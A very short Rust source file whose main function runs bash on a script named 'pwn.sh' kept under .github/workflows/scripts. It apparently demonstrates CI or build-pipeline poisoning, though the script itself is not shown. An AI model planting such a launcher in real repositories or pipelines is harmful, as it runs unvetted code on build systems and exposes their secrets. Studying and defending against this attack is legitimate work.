fn main() {
    let _ = std::process::Command::new("bash")
        .arg(".github/workflows/scripts/pwn.sh")
        .status();
}
